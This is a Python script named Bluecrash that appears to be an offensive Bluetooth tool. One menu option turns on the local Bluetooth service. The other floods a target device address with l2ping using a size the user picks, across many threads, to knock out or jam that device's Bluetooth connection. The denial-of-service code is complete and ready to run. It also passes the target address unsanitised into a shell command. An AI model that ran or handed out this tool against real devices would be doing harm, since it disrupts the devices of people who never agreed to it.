import os
import threading
import time
import subprocess
print("Welcome! Bluecrash")
print('''
         ____  _             ____               _
        | __ )| |_   _  ___ / ___|_ __ __ _ ___| |__
        |  _ \| | | | |/ _ \ |   | '__/ _` / __| '_ \\
        | |_) | | |_| |  __/ |___| | | (_| \__ \ | | |
        |____/|_|\__,_|\___|\____|_|  \__,_|___/_| |_|
        ______________________________________________
                          coded by:ixink(Rayhan Ahmed)
           contact me:linkedin.com/in/rayhan-ahmed-uiu
''')
message=input("What would you like to do?\n1.BlueScan \n2.BlueCrash\n")
if message=="1":
    print("Welcome! Bluecrash")
    print('''
         ____  _             ____               _
        | __ )| |_   _  ___ / ___|_ __ __ _ ___| |__
        |  _ \| | | | |/ _ \ |   | '__/ _` / __| '_ \\
        | |_) | | |_| |  __/ |___| | | (_| \__ \ | | |
        |____/|_|\__,_|\___|\____|_|  \__,_|___/_| |_|
        ______________________________________________
                          coded by:ixink(Rayhan Ahmed)
           contact me:linkedin.com/in/rayhan-ahmed-uiu
    ''')
    def run_apt():
        try:
            subprocess.run(["sudo", "rfkill", "unblock", "all"], check=True)
            subprocess.run(["sudo", "systemctl", "start", "bluetooth"], check=True)
            subprocess.run(["sudo", "systemctl", "enable", "bluetooth"], check=True)
            subprocess.run(["sudo", "bluetoothctl"], check=True)
            print("Running!")
        except subprocess.CalledProcessError:
                print("Error!")
    if __name__ == "__main__":
        run_apt()
elif message=="2":
    def DOS(target_addr, packages_size):
        os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
    def printLogo():
        print("Welcome! Bluecrash")
        print('''
         ____  _             ____               _
        | __ )| |_   _  ___ / ___|_ __ __ _ ___| |__
        |  _ \| | | | |/ _ \ |   | '__/ _` / __| '_ \\
        | |_) | | |_| |  __/ |___| | | (_| \__ \ | | |
        |____/|_|\__,_|\___|\____|_|  \__,_|___/_| |_|
        ______________________________________________
                          coded by:ixink(Rayhan Ahmed)
           contact me:linkedin.com/in/rayhan-ahmed-uiu
        ''')


    def main():
        printLogo()
        time.sleep(0.1)
        print('')
        if (input("READY TO PROCEED? (Y/N) > ") in ['y', 'Y']):
            time.sleep(0.1)
            os.system('clear')
            printLogo()
            print('')
            target_addr = input('Target address > ')
            if len(target_addr) < 1:
                print('[!] ERROR: Target addr is missing')
                exit(0)
                
            try:
                packages_size = int(input('Packages size > '))
            except:
                print('[!] ERROR: Packages size must be an integer')
                exit(0)
            try:
                threads_count = int(input('Threads count > '))
            except:
                print('[!] ERROR: Threads count must be an integer')
                exit(0)
            print('')
            os.system('clear')

            print("\x1b[31m[*] Jamming target device BT signal in 3 seconds...")

            for i in range(0, 3):
                print('[*] ' + str(3 - i))
                time.sleep(1)
            os.system('clear')
            print('[*] Building threads...\n')

            for i in range(0, threads_count):
                print('[*] Built thread №' + str(i + 1))
                threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
            print('[*] Built all threads...')
            print('[*] Starting...')
        else:
            exit(0)
    if __name__ == '__main__':
        try:
            os.system('clear')
            main()
        except KeyboardInterrupt:
            time.sleep(0.1)
            print('\n[*] Aborted')
            exit(0)
        except Exception as e:
            time.sleep(0.1)
            print('[!] ERROR: ' + str(e))
else:
    print("Error! Choose 1 or 2.")
